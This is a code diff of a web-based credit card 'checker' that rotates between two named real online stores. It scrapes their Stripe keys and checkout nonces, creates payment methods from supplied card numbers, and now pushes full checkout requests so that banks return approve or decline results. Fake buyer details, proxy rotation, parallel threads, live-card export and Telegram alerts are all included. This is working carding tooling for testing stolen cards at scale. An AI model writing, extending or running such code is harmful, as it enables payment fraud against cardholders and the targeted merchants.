@@ -23,22 +23,22 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Rotating Sites Auth Checker (Auth-Only Mode)", version="8.0.0")
+app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
-        "name": "Astra Store (EDD + Stripe Auth)",
+        "name": "Astra Store (EDD Real Auth)",
         "base_url": "https://store.brainstormforce.com",
         "preload_url": "https://store.brainstormforce.com/?add-to-cart=51171",
         "auth_url": "https://store.brainstormforce.com/wp/wp-admin/admin-ajax.php?payment-mode=stripe",
-        "engine": "edd_stripe_auth",
+        "engine": "edd_real_auth",
     },
     "rollerco": {
-        "name": "Rollerco (WooCommerce + Stripe Auth)",
+        "name": "Rollerco (WooCommerce Real Auth)",
         "base_url": "https://rollerco.com.au",
         "preload_url": "https://rollerco.com.au/my-account/checkout/",
         "auth_url": "https://rollerco.com.au/?wc-ajax=checkout",
-        "engine": "woocommerce_stripe_auth",
+        "engine": "woocommerce_real_auth",
     },
 }
 
@@ -196,11 +196,12 @@ async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = 
     return default_meta
 
 
-# --- AUTH ENGINE 1: ASTRA STORE (EDD Auth Only) ---
+# --- REAL AUTH ENGINE 1: ASTRA STORE (EDD Backend Processing) ---
 async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://store.brainstormforce.com"
     product_url = host + "/?add-to-cart=51171"
     checkout_url = host + "/checkout/"
+    ajax_url = host + "/wp/wp-admin/admin-ajax.php?payment-mode=stripe"
 
     first = fake.first_name()
     last = fake.last_name()
@@ -216,7 +217,6 @@ async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, c
     m = re.search(r'publishable_key["\']\s*:\s*["\'](pk_live_[^"\']+)["\']', html)
     pk_key = m.group(1) if m else "pk_live_5195uMmKBf5DxE7APbEoMk3sRepPFy2GhkvRLPFiCHUch44CXAF7GGfH51n8Vf4GD4D5z3P1Vtr38777Xpit8lPHo00sD2eFKPK"
 
-    # Pure Tokenization / Authorization Check without completing charge
     stripe_payload = {
         "type": "card",
         "card[number]": cc,
@@ -243,8 +243,7 @@ async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, c
         err = sj["error"]
         msg = err.get("message", "Tokenization failed")
         code = err.get("decline_code") or err.get("code") or ""
-        reason = f"{msg} [{code}]" if code else msg
-        return "DEAD", reason, stripe_res.status_code
+        return "DEAD", f"{msg} [{code}]" if code else msg, stripe_res.status_code
 
     pm_token = sj.get("id")
     if not pm_token:
@@ -257,14 +256,42 @@ async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, c
     tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
     tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")
 
-    # Dahil Auth-only tayo, hihinto na tayo dito sa matagumpay na tokenization/auth check kaysa i-trigger ang buong checkout purchase.
-    return "LIVE", f"Auth Approved / Tokenized Successfully | {tag_meta}", stripe_res.status_code
+    # Real Auth: Ipinapasa natin sa EDD Backend Ajax para piliting i-process ng Stripe Gateway ang transaction
+    checkout_payload = {
+        "edd_action": "purchase", "edd_email": email, "edd_first": first, "edd_last": last,
+        "billing_country": "US", "card_state": state_code, "card_zip": postcode,
+        "card_name": f"{first} {last}", "payment-mode": "stripe", "edd-gateway": "stripe",
+        "stripe_payment_method": pm_token, "action": "edds_process_checkout",
+    }
+
+    res = await session.post(ajax_url, data=checkout_payload, headers={
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": host, "referer": checkout_url, "x-requested-with": "XMLHttpRequest"
+    }, timeout=15)
+
+    try:
+        res_text = res.text
+        if "order-received" in res.url or "success" in res_text.lower():
+            return "LIVE", f"Auth Approved Successfully | {tag_meta}", res.status_code
+        
+        # Pagkuha ng eksaktong error message mula sa EDD/Stripe server response
+        clean_msg = re.sub(r"<[^>]+>", "", res_text).strip()
+        if not clean_msg or "error" in clean_msg.lower():
+            try:
+                rj = res.json()
+                clean_msg = rj.get("message") or rj.get("error") or "Card declined by gateway"
+            except Exception:
+                clean_msg = "Card declined by gateway"
+        return "DEAD", f"{clean_msg[:80]} | {tag_meta}", res.status_code
+    except Exception as e:
+        return "DEAD", f"Card declined by gateway | {tag_meta}", res.status_code
 
 
-# --- AUTH ENGINE 2: ROLLERCO (WooCommerce Auth Only) ---
+# --- REAL AUTH ENGINE 2: ROLLERCO (WooCommerce Backend Processing) ---
 async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://rollerco.com.au"
     checkout_url = host + "/my-account/checkout/"
+    ajax_checkout = host + "/?wc-ajax=checkout"
 
     first = random.choice(AU_FIRST)
     last = random.choice(AU_LAST)
@@ -279,10 +306,12 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
 
     pk_m = re.search(r'"publicKey"\s*:\s*"(pk_live_[A-Za-z0-9]+)"', html)
     pk = pk_m.group(1) if pk_m else None
+    nonce_m = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', html)
+    nonce = nonce_m.group(1) if nonce_m else None
     acct_m = re.search(r'"stripeAccount"\s*:\s*"(acct_[A-Za-z0-9]+)"', html)
     acct = acct_m.group(1) if acct_m else None
 
-    if not pk:
+    if not pk or not nonce:
         return "DEAD", "Checkout parameters missing", 200
 
     es_params = {
@@ -327,7 +356,6 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
     }
     if acct: stripe_payload["_stripe_account"] = acct
 
-    # Magpapadala sa Stripe para sa Auth Verification / Payment Method creation nang hindi na ipinapasa sa WooCommerce ajax checkout capture
     stripe_res = await session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, headers={
         "content-type": "application/x-www-form-urlencoded",
         "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"
@@ -351,8 +379,35 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
     tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
     tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")
 
-    # Auth-only mode: Matagumpay na na-auth at na-tokenize ng Stripe ang card nang walang actual charge execution
-    return "LIVE", f"Auth Approved Successfully | {tag_meta}", stripe_res.status_code
+    # Real Auth: Ipinapasa sa WooCommerce Checkout Ajax para kumuha ng totoong bank response (Live/Decline/3DS)
+    checkout_payload = {
+        "billing_email": email, "billing_first_name": first, "billing_last_name": last,
+        "billing_phone": phone, "billing_country": "AU", "billing_address_1": "23 Endeavour Drive",
+        "billing_city": city, "billing_state": "SA", "billing_postcode": postcode,
+        "payment_method": "stripe_cc", "stripe_cc_token_key": pm_token,
+        "stripe_cc_payment_method_id": pm_token, "terms": "on",
+        "woocommerce-process-checkout-nonce": nonce
+    }
+
+    res = await session.post(ajax_checkout, data=checkout_payload, headers={
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": host, "referer": checkout_url, "x-requested-with": "XMLHttpRequest"
+    }, timeout=15)
+
+    try:
+        jj = res.json()
+        result = (jj.get("result") or "").lower()
+        messages = jj.get("messages") or ""
+        clean_msg = re.sub(r"<[^>]+>", "", messages).strip() or "The card has been declined for an unknown reason."
+        redirect = jj.get("redirect") or ""
+
+        if result == "success":
+            if any(x in redirect.lower() for x in ("authentication", "3ds", "stripe.com", "confirm_payment_intent")):
+                return "LIVE", f"3DS Challenge Triggered | {tag_meta}"
+            return "LIVE", f"Auth Approved Successfully | {tag_meta}"
+        return "DEAD", f"{clean_msg} | {tag_meta}", res.status_code
+    except Exception:
+        return "DEAD", f"The card has been declined for an unknown reason. | {tag_meta}", res.status_code
 
 
 async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "rotate_clean") -> AuthVerdict:
@@ -483,15 +538,15 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Rotating Sites Auth Checker (Auth-Only)</title>
+    <title>Rotating Sites Real Auth Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen p-6">
     <main class="max-w-5xl mx-auto space-y-6">
         <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
             <div>
-                <h1 class="text-2xl font-bold text-emerald-400">Rotating Sites Auth Checker</h1>
-                <p class="text-xs text-slate-400 font-mono">Astra Store & Rollerco Gateway (Auth-Only Mode - No Charge)</p>
+                <h1 class="text-2xl font-bold text-emerald-400">Rotating Sites Real Auth Checker</h1>
+                <p class="text-xs text-slate-400 font-mono">Astra Store & Rollerco Gateway + Full Backend Validation</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-violet-900/70 hover:bg-violet-800 text-violet-200 border border-violet-700 px-3 py-1.5 rounded-lg transition font-semibold">
@@ -508,8 +563,8 @@ async def index() -> str:
                     <label class="block text-xs font-medium text-slate-400 mb-1">Select Gateway / Rotation</label>
                     <select id="targetSelect" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
                         <option value="rotate_clean">⚡ AUTO-ROTATE ASTRA & ROLLERCO</option>
-                        <option value="astra_store">Astra Store (EDD Auth)</option>
-                        <option value="rollerco">Rollerco (WooCommerce Auth)</option>
+                        <option value="astra_store">Astra Store (EDD Real Auth)</option>
+                        <option value="rollerco">Rollerco (WooCommerce Real Auth)</option>
                     </select>
                 </div>
                 <div class="flex items-end gap-3">
@@ -583,7 +638,7 @@ async def index() -> str:
             <div class="flex gap-3">
                 <button id="checkButton" onclick="runBatchChecker()"
                     class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold flex-1 transition shadow-lg shadow-emerald-950/50">
-                    Start Auth Check
+                    Start Real Auth Check
                 </button>
                 <button id="pauseButton" onclick="togglePause()" disabled
                     class="bg-amber-600 hover:bg-amber-500 px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
@@ -671,7 +726,7 @@ async def index() -> str:
         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
-        a.download = "live_auth_cards.txt";
+        a.download = "live_real_auth_cards.txt";
         a.click();
     }
 
@@ -686,7 +741,7 @@ async def index() -> str:
         isStopped = true;
         isPaused = false;
         document.getElementById("checkButton").disabled = false;
-        document.getElementById("checkButton").textContent = "Start Auth Check";
+        document.getElementById("checkButton").textContent = "Start Real Auth Check";
         document.getElementById("pauseButton").disabled = true;
         document.getElementById("stopButton").disabled = true;
         document.getElementById("pauseButton").textContent = "Pause";
@@ -804,7 +859,7 @@ async def index() -> str:
                         liveBox.appendChild(row);
                         playTone('live');
                         if (tgToken && tgChatId) {
-                            sendTelegram(tgToken, tgChatId, `🔥 AUTH APPROVED (LIVE) 🔥\\n${line}`);
+                            sendTelegram(tgToken, tgChatId, `🔥 REAL AUTH APPROVED (LIVE) 🔥\\n${line}`);
                         }
                     } else {
                         dead++;
@@ -825,7 +880,7 @@ async def index() -> str:
         }
 
         const workers = Math.min(maxThreads, total);
-        btn.textContent = `Running Auth (${workers} threads)...`;
+        btn.textContent = `Running Real Auth (${workers} threads)...`;
         await Promise.all(Array.from({ length: workers }, () => cardWorker()));
 
         stopChecker();
